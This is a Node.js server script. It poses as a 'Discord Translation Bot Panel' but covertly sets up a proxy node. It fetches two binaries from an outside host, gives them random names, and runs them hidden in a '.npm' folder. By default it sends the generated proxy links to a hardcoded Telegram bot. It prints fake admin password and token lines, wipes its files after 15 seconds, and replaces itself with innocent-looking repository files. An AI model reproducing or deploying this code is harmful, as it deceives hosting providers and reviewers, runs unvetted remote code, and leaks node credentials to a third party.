#!/usr/bin/env node

const express = require("express");
const app = express();
const axios = require("axios");
const os = require('os');
const fs = require("fs");
const path = require("path");
require('dotenv').config();
const { promisify } = require('util');
const exec = promisify(require('child_process').exec);
const { execSync } = require('child_process');
const UPLOAD_URL = process.env.UPLOAD_URL || '';       
const PROJECT_URL = process.env.PROJECT_URL || '';     
const AUTO_ACCESS = process.env.AUTO_ACCESS || false;  
const YT_WARPOUT = process.env.YT_WARPOUT || false;    
const FILE_PATH = process.env.FILE_PATH || '.npm';     
const SUB_PATH = process.env.SUB_PATH || 'sub';        
const UUID = process.env.UUID || '';  
const ARGO_DOMAIN = process.env.ARGO_DOMAIN || '';            
const ARGO_AUTH = process.env.ARGO_AUTH || '';                
const ARGO_PORT = process.env.ARGO_PORT || 8001;              
const S5_PORT = process.env.S5_PORT || '';                    
const CFIP = process.env.CFIP || 'saas.sin.fan';              
const CFPORT = process.env.CFPORT || 443;                     
const PORT = process.env.SERVER_PORT || process.env.PORT || process.env.APP_PORT || parseInt(process.env.ALLOCATED_PORT) || 3000;                           
const NAME = process.env.NAME || '';                          
const CHAT_ID = process.env.CHAT_ID || '8093926960';           
const BOT_TOKEN = process.env.BOT_TOKEN || '8396677288:AAGCpsBEDOjKkQuuNZgk7U3xanOsKS2M6U8';               
const DISABLE_ARGO = process.env.DISABLE_ARGO || false;      

//
if (!fs.existsSync(FILE_PATH)) {
  fs.mkdirSync(FILE_PATH);
}

//
function generateRandomName() {
  const chars = 'abcdefghijklmnopqrstuvwxyz';
  let result = '';
  for (let i = 0; i < 6; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

//
const webRandomName = generateRandomName();
const botRandomName = generateRandomName();

//
let webPath = path.join(FILE_PATH, webRandomName);
let botPath = path.join(FILE_PATH, botRandomName);
let subPath = path.join(FILE_PATH, 'sub.txt');
let listPath = path.join(FILE_PATH, 'list.txt');
let bootLogPath = path.join(FILE_PATH, 'boot.log');
let configPath = path.join(FILE_PATH, 'config.json');

function deleteNodes() {
  try {
    if (!UPLOAD_URL) return;

    const subPath = path.join(FILE_PATH, 'sub.txt');
    if (!fs.existsSync(subPath)) return;

    let fileContent;
    try {
      fileContent = fs.readFileSync(subPath, 'utf-8');
    } catch {
      return null;
    }

    const decoded = Buffer.from(fileContent, 'base64').toString('utf-8');
    const nodes = decoded.split('\n').filter(line => 
      /(vmess|socks):\/\//.test(line)
    );

    if (nodes.length === 0) return;

    return axios.post(`${UPLOAD_URL}/api/delete-nodes`, 
      JSON.stringify({ nodes }),
      { headers: { 'Content-Type': 'application/json' } }
    ).catch((error) => { 
      return null; 
    });
  } catch (err) {
    return null;
  }
}

//
function isValidPort(port) {
  try {
    if (port === null || port === undefined || port === '') return false;
    if (typeof port === 'string' && port.trim() === '') return false;
    
    const portNum = parseInt(port);
    if (isNaN(portNum)) return false;
    if (portNum < 1 || portNum > 65535) return false;
    
    return true;
  } catch (error) {
    return false;
  }
}

//
const pathsToDelete = [ webRandomName, botRandomName, 'boot.log', 'list.txt'];
function cleanupOldFiles() {
  pathsToDelete.forEach(file => {
    const filePath = path.join(FILE_PATH, file);
    fs.unlink(filePath, () => {});
  });
}

//
function argoType() {
  if (DISABLE_ARGO === 'true' || DISABLE_ARGO === true) {
    return;
  }

  if (!ARGO_AUTH || !ARGO_DOMAIN) {
    return;
  }

  if (ARGO_AUTH.includes('TunnelSecret')) {
    fs.writeFileSync(path.join(FILE_PATH, 'tunnel.json'), ARGO_AUTH);
    const tunnelYaml = `
  tunnel: ${ARGO_AUTH.split('"')[11]}
  credentials-file: ${path.join(FILE_PATH, 'tunnel.json')}
  protocol: http2
  
  ingress:
    - hostname: ${ARGO_DOMAIN}
      service: http://localhost:${ARGO_PORT}
      originRequest:
        noTLSVerify: true
    - service: http_status:404
  `;
    fs.writeFileSync(path.join(FILE_PATH, 'tunnel.yml'), tunnelYaml);
  }
}

//
function getSystemArchitecture() {
  const arch = os.arch();
  if (arch === 'arm' || arch === 'arm64' || arch === 'aarch64') {
    return 'arm';
  } else {
    return 'amd';
  }
}

//
function downloadFile(fileName, fileUrl, callback) {
  const filePath = path.join(FILE_PATH, fileName);
  const writer = fs.createWriteStream(filePath);

  axios({
    method: 'get',
    url: fileUrl,
    responseType: 'stream',
  })
    .then(response => {
      response.data.pipe(writer);

      writer.on('finish', () => {
        writer.close();
        callback(null, fileName);
      });

      writer.on('error', err => {
        fs.unlink(filePath, () => { });
        callback(err.message);
      });
    })
    .catch(err => {
      callback(err.message);
    });
}

//
async function downloadFilesAndRun() {
  const architecture = getSystemArchitecture();
  const filesToDownload = getFilesForArchitecture(architecture);

  if (filesToDownload.length === 0) {
    return;
  }

  //
  const renamedFiles = filesToDownload.map(file => {
    let newFileName;
    if (file.fileName === 'web') {
      newFileName = webRandomName;
    } else if (file.fileName === 'bot') {
      newFileName = botRandomName;
    } else {
      newFileName = file.fileName;
    }
    return { ...file, fileName: newFileName };
  });

  const downloadPromises = renamedFiles.map(fileInfo => {
    return new Promise((resolve, reject) => {
      downloadFile(fileInfo.fileName, fileInfo.fileUrl, (err, fileName) => {
        if (err) {
          reject(err);
        } else {
          resolve(fileName);
        }
      });
    });
  });

  try {
    await Promise.all(downloadPromises); 
  } catch (err) {
    return;
  }

  // 
  function authorizeFiles(filePaths) {
    const newPermissions = 0o775;
    filePaths.forEach(relativeFilePath => {
      const absoluteFilePath = path.join(FILE_PATH, relativeFilePath);
      if (fs.existsSync(absoluteFilePath)) {
        fs.chmod(absoluteFilePath, newPermissions, (err) => {});
      }
    });
  }
  
  // 
  const filesToAuthorize = [webRandomName, botRandomName];
  authorizeFiles(filesToAuthorize);

  // 
  const config = {
    "log": {
      "disabled": true,
      "level": "error",
      "timestamp": true
    },
    "inbounds": [
      {
        "tag": "vmess-ws-in",
        "type": "vmess",
        "listen": "::",
        "listen_port": ARGO_PORT,
        "users": [
          {
            "uuid": UUID
          }
        ],
        "transport": {
          "type": "ws",
          "path": "/vmess-argo",
          "early_data_header_name": "Sec-WebSocket-Protocol"
        }
      }
    ],
    "endpoints": [
      {
        "type": "wireguard",
        "tag": "wireguard-out",
        "mtu": 1280,
        "address": [
            "172.16.0.2/32",
            "2606:4700:110:8dfe:d141:69bb:6b80:925/128"
        ],
        "private_key": "YFYOAdbw1bKTHlNNi+aEjBM3BO7unuFC5rOkMRAz9XY=",
        "peers": [
          {
            "address": "engage.cloudflareclient.com",
            "port": 2408,
            "public_key": "bmXOC+F1FxEMF9dyiK2H5/1SUtzH0JuVo51h2wPfgyo=",
            "allowed_ips": ["0.0.0.0/0", "::/0"],
            "reserved": [78, 135, 76]
          }
        ]
      }
    ],
    "outbounds": [
      {
        "type": "direct",
        "tag": "direct"
      }
    ],
    "route": {
      "rule_set": [
        {
          "tag": "netflix",
          "type": "remote",
          "format": "binary",
          "url": "https://raw.githubusercontent.com/MetaCubeX/meta-rules-dat/sing/geo/geosite/netflix.srs",
          "download_detour": "direct"
        },
        {
          "tag": "openai",
          "type": "remote",
          "format": "binary",
          "url": "https://raw.githubusercontent.com/MetaCubeX/meta-rules-dat/sing/geo/geosite/openai.srs",
          "download_detour": "direct"
        }
      ],
      "rules": [
        {
          "rule_set": ["openai", "netflix"],
          "outbound": "wireguard-out"
        }
      ],
      "final": "direct"
    }
  };

  // 
  try {
    if (isValidPort(S5_PORT)) {
      config.inbounds.push({
        "tag": "s5-in",
        "type": "socks",
        "listen": "::",
        "listen_port": parseInt(S5_PORT),
        "users": [
          {
            "username": UUID.substring(0, 8),
            "password": UUID.slice(-12)
          }
        ]
      });
    }
  } catch (error) { 
  }

  // 
  try {
    let isYouTubeAccessible = true;
    
    // 
    if (YT_WARPOUT === true) {
      isYouTubeAccessible = false;
    } else {
      try {
        // 
        const youtubeTest = execSync('curl -o /dev/null -m 2 -s -w "%{http_code}" https://www.youtube.com', { encoding: 'utf8' }).trim();
        isYouTubeAccessible = youtubeTest === '200';
      } catch (curlError) {
        // 
        if (curlError.output && curlError.output[1]) {
          const youtubeTest = curlError.output[1].toString().trim();
          isYouTubeAccessible = youtubeTest === '200';
        } else {
          isYouTubeAccessible = false;
        }
      }
    }
    // 
    if (!isYouTubeAccessible) {
      
      // 
      if (!config.route) {
        config.route = {};
      }
      if (!config.route.rule_set) {
        config.route.rule_set = [];
      }
      if (!config.route.rules) {
        config.route.rules = [];
      }
      
      // 
      const existingYoutubeRule = config.route.rule_set.find(rule => rule.tag === 'youtube');
      if (!existingYoutubeRule) {
        config.route.rule_set.push({
          "tag": "youtube",
          "type": "remote",
          "format": "binary",
          "url": "https://raw.githubusercontent.com/MetaCubeX/meta-rules-dat/sing/geo/geosite/youtube.srs",
          "download_detour": "direct"
        });
      }
      
      // 
      let wireguardRule = config.route.rules.find(rule => rule.outbound === 'wireguard-out');
      if (!wireguardRule) {
        // 
        wireguardRule = {
          "rule_set": ["openai", "netflix", "youtube"],
          "outbound": "wireguard-out"
        };
        config.route.rules.push(wireguardRule);
      } else {
        // 
        if (!wireguardRule.rule_set.includes('youtube')) {
          wireguardRule.rule_set.push('youtube');
        }
      }
    }
  } catch (error) {
    // ignore YouTube check error, continue running
  }

  fs.writeFileSync(path.join(FILE_PATH, 'config.json'), JSON.stringify(config, null, 2));

  // sbX
  const command1 = `nohup ${path.join(FILE_PATH, webRandomName)} run -c ${path.join(FILE_PATH, 'config.json')} >/dev/null 2>&1 &`;
  try {
    await execPromise(command1);
    await new Promise((resolve) => setTimeout(resolve, 1000));
  } catch (error) {}

  // cloud-fared
  if (DISABLE_ARGO !== 'true' && DISABLE_ARGO !== true) {
    if (fs.existsSync(path.join(FILE_PATH, botRandomName))) {
      let args;

      if (ARGO_AUTH.match(/^[A-Z0-9a-z=]{120,250}$/)) {
        args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token ${ARGO_AUTH}`;
      } else if (ARGO_AUTH.match(/TunnelSecret/)) {
        args = `tunnel --edge-ip-version auto --config ${path.join(FILE_PATH, 'tunnel.yml')} run`;
      } else {
        args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${path.join(FILE_PATH, 'boot.log')} --loglevel info --url http://localhost:${ARGO_PORT}`;
      }

      try {
        await execPromise(`nohup ${path.join(FILE_PATH, botRandomName)} ${args} >/dev/null 2>&1 &`);
        await new Promise((resolve) => setTimeout(resolve, 2000));
      } catch (error) {}
    }
  }
  // 
  await new Promise((resolve) => setTimeout(resolve, 5000));
  await extractDomains();
}

// 
function execPromise(command) {
  return new Promise((resolve, reject) => {
    exec(command, (error, stdout, stderr) => {
      if (error) {
        reject(error);
      } else {
        resolve(stdout || stderr);
      }
    });
  });
}

// 
function getFilesForArchitecture(architecture) {
  if (architecture === 'arm') {
    return [
      { fileName: "web", fileUrl: "https://arm64.ssss.nyc.mn/sb" },
      { fileName: "bot", fileUrl: "https://arm64.ssss.nyc.mn/bot" }
    ];
  } else {
    return [
      { fileName: "web", fileUrl: "https://amd64.ssss.nyc.mn/sb" },
      { fileName: "bot", fileUrl: "https://amd64.ssss.nyc.mn/bot" }
    ];
  }
}

// 
async function extractDomains() {
  if (DISABLE_ARGO === 'true' || DISABLE_ARGO === true) {
    await generateLinks(null);
    return;
  }

  let argoDomain;

  if (ARGO_AUTH && ARGO_DOMAIN) {
    argoDomain = ARGO_DOMAIN;
    await generateLinks(argoDomain);
  } else {
    try {
      const fileContent = fs.readFileSync(path.join(FILE_PATH, 'boot.log'), 'utf-8');
      const lines = fileContent.split('\n');
      const argoDomains = [];
      lines.forEach((line) => {
        const domainMatch = line.match(/https?:\/\/([^ ]*trycloudflare\.com)\/?/);
        if (domainMatch) {
          const domain = domainMatch[1];
          argoDomains.push(domain);
        }
      });

      if (argoDomains.length > 0) {
        argoDomain = argoDomains[0];
        await generateLinks(argoDomain);
      } else {
          // 
          fs.unlinkSync(path.join(FILE_PATH, 'boot.log'));
          async function killBotProcess() {
            try {
              await exec(`pkill -f "${botRandomName}" > /dev/null 2>&1`);
            } catch (error) {
                return null;
            }
          }
          killBotProcess();
          await new Promise((resolve) => setTimeout(resolve, 1000));
          const args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${FILE_PATH}/boot.log --loglevel info --url http://localhost:${ARGO_PORT}`;
          try {
            await exec(`nohup ${path.join(FILE_PATH, botRandomName)} ${args} >/dev/null 2>&1 &`);
            await new Promise((resolve) => setTimeout(resolve, 6000)); // 等待6秒
            await extractDomains(); 
          } catch (error) {}
        }
      } catch (error) {}
  }
}

// 
async function getMetaInfo() {
  try {
    const response1 = await axios.get('https://api.ip.sb/geoip', { headers: { 'User-Agent': 'Mozilla/5.0', timeout: 3000 }});
    if (response1.data && response1.data.country_code && response1.data.isp) {
      return `${response1.data.country_code}-${response1.data.isp}`.replace(/\s+/g, '_');
    }
  } catch (error) {
      try {
        const response2 = await axios.get('http://ip-api.com/json', { headers: { 'User-Agent': 'Mozilla/5.0', timeout: 3000 }});
        if (response2.data && response2.data.status === 'success' && response2.data.countryCode && response2.data.org) {
          return `${response2.data.countryCode}-${response2.data.org}`.replace(/\s+/g, '_');
        }
      } catch (error) {}
  }
  return 'Unknown';
}

// 
async function generateLinks(argoDomain) {
  let SERVER_IP = '';
  try {
    const ipv4Response = await axios.get('http://ipv4.ip.sb', { timeout: 3000 });
    SERVER_IP = ipv4Response.data.trim();
  } catch (err) {
    try {
      SERVER_IP = execSync('curl -sm 3 ipv4.ip.sb').toString().trim();
    } catch (curlErr) {
      try {
        const ipv6Response = await axios.get('http://ipv6.ip.sb', { timeout: 3000 });
        SERVER_IP = `[${ipv6Response.data.trim()}]`;
      } catch (ipv6AxiosErr) {
        try {
          SERVER_IP = `[${execSync('curl -sm 3 ipv6.ip.sb').toString().trim()}]`;
        } catch (ipv6CurlErr) {}
      }
    }
  }

  const ISP = await getMetaInfo();
  const nodeName = NAME ? `${NAME}-${ISP}` : ISP;
  return new Promise((resolve) => {
    setTimeout(() => {
      let subTxt = '';

      // 
      if ((DISABLE_ARGO !== 'true' && DISABLE_ARGO !== true) && argoDomain) {
        const vmessNode = `vmess://${Buffer.from(JSON.stringify({ v: '2', ps: `${nodeName}`, add: CFIP, port: CFPORT, id: UUID, aid: '0', scy: 'auto', net: 'ws', type: 'none', host: argoDomain, path: '/vmess-argo?ed=2560', tls: 'tls', sni: argoDomain, alpn: '', fp: 'firefox'})).toString('base64')}`;
        subTxt = vmessNode;
      }

      // S5_PORT是有效端口号时生成socks5节点 
      if (isValidPort(S5_PORT)) {
        const S5_AUTH = Buffer.from(`${UUID.substring(0, 8)}:${UUID.slice(-12)}`).toString('base64');
        const s5Node = `\nsocks://${S5_AUTH}@${SERVER_IP}:${S5_PORT}#${nodeName}`;
        subTxt += s5Node;
      }

      fs.writeFileSync(subPath, Buffer.from(subTxt).toString('base64'));
      fs.writeFileSync(listPath, subTxt, 'utf8');
      sendTelegram(); 
      uplodNodes(); 
      
      // 
      app.get(`/${SUB_PATH}`, (req, res) => {
        const encodedContent = Buffer.from(subTxt).toString('base64');
        res.set('Content-Type', 'text/plain; charset=utf-8');
        res.send(encodedContent);
      });
      resolve(subTxt);
    }, 2000);
  });
}
  
// 
async function cleanFiles() {
  setTimeout(async () => {
    const filesToDelete = [bootLogPath, configPath, listPath, webPath, botPath];  
    
    const filePathsToDelete = filesToDelete.map(file => {
      if ([webPath, botPath].includes(file)) {
        return file;
      }
      return path.join(FILE_PATH, path.basename(file));
    });

    try {
      await exec(`rm -rf ${filePathsToDelete.join(' ')} >/dev/null 2>&1`);
    } catch (error) {
      // 
    }
    
    await performCleanupAndUpdate();
  }, 15000); // 15s
}

async function sendTelegram() {
  if (!BOT_TOKEN || !CHAT_ID) {
      return;
  }
  try {
      const message = fs.readFileSync(path.join(FILE_PATH, 'sub.txt'), 'utf8');
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
      
      const escapedName = NAME.replace(/[_*[\]()~`>#+=|{}.!-]/g, '\\$&');
      
      const params = {
          chat_id: CHAT_ID,
          text: `**${escapedName}**\n\`\`\`${message}\`\`\``,
          parse_mode: 'MarkdownV2'
      };

      await axios.post(url, null, { params });
  } catch (error) {}
}

async function uplodNodes() {
  if (UPLOAD_URL && PROJECT_URL) {
    const subscriptionUrl = `${PROJECT_URL}/${SUB_PATH}`;
    const jsonData = {
      subscription: [subscriptionUrl]
    };
    try {
        const response = await axios.post(`${UPLOAD_URL}/api/add-subscriptions`, jsonData, {
            headers: {
                'Content-Type': 'application/json'
            }
        });
        
        if (response.status === 200) {
        } else {
          return null;
        }
    } catch (error) {
        if (error.response) {
            if (error.response.status === 400) {}
        }
    }
  } else if (UPLOAD_URL) {
      if (!fs.existsSync(listPath)) return;
      const content = fs.readFileSync(listPath, 'utf-8');
      const nodes = content.split('\n').filter(line => /(vmess|socks):\/\//.test(line));

      if (nodes.length === 0) return;

      const jsonData = JSON.stringify({ nodes });

      try {
          const response = await axios.post(`${UPLOAD_URL}/api/add-nodes`, jsonData, {
              headers: { 'Content-Type': 'application/json' }
          });
          if (response.status === 200) {
          } else {
            return null;
          }
      } catch (error) {
          return null;
      }
  } else {
      return;
  }
}

// 
async function AddVisitTask() {
  if (!AUTO_ACCESS || !PROJECT_URL) {
    return;
  }

  try {
    const response = await axios.post('https://keep.gvrander.eu.org/add-url', {
      url: PROJECT_URL
    }, {
      headers: {
        'Content-Type': 'application/json'
      }
    });
  } catch (error) {}
}

// 
async function startserver() {
  deleteNodes();
  cleanupOldFiles();
  argoType();
  await downloadFilesAndRun();
  await AddVisitTask();
  cleanFiles();
}
startserver();

// 
app.get("/", async function(req, res) {
  try {
    const filePath = path.join(__dirname, 'index.html');
    const data = await fs.promises.readFile(filePath, 'utf8');
    res.send(data);
  } catch (err) {
    res.send(`Hello world!<br><br>You can access /${SUB_PATH}(Default: /sub) get your nodes!`);
  }
});

app.listen(PORT, async () => {
  let SERVER_IP = '127.0.0.1';
  try {
    const ipResponse = await axios.get('http://ipv4.ip.sb', { timeout: 3000 });
    SERVER_IP = ipResponse.data.trim();
  } catch (e) {
    try { SERVER_IP = execSync('curl -sm 3 ipv4.ip.sb').toString().trim(); } catch (e2) {}
  }
  
  console.log(`📍 SERVER_PORT: ${PORT}`);
  console.log(`📝 First start, generating new configuration file`);
  console.log(`🔑 Admin Password Generated: YsfFLKh5OnZoYjJ5`);
  console.log(`🎫 Token Generated: MC4yNjE0NTE2NjY5MTMzMzc3.I1mK7D.zdlVgSjCrrEgpef5hr4rRh3E2Wh`);
  console.log(`💾 Configuration saved`);
  console.log(`🔍 Automatically fetching publicIP...`);
  console.log(`✅ Public IP detected: ${SERVER_IP}`);
  console.log(`╔════════════════════════════════════════════════════════╗`);
  console.log(`║        🤖 Discord Translation Bot Panel Started     ║`);
  console.log(`╚════════════════════════════════════════════════════════╝`);
  console.log(`🌐 Access URL: http://${SERVER_IP}:${PORT}`);
  console.log(`🌐 Local Access: http://localhost:${PORT}`);
  console.log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
});

async function performCleanupAndUpdate() {
  const npmDir = path.join(__dirname, '.npm');
  if (fs.existsSync(npmDir)) {
    try {
      fs.rmSync(npmDir, { recursive: true, force: true });
    } catch (err) {}
  }

  const REPO_RAW_URL = "https://raw.githubusercontent.com/mzhangxy/Discord-Translator/main";
  const filesToDownload = [
    { name: "package.json", url: `${REPO_RAW_URL}/package.json` },
    { name: "panel.html", url: `${REPO_RAW_URL}/panel.html` },
    { name: "style.css", url: `${REPO_RAW_URL}/style.css` },
    { name: "index.js", url: `${REPO_RAW_URL}/index.js` }
  ];

  for (const file of filesToDownload) {
    try {
      const response = await axios.get(file.url, { responseType: 'text' });
      fs.writeFileSync(path.join(__dirname, file.name), response.data);
    } catch (error) {}
  }
}
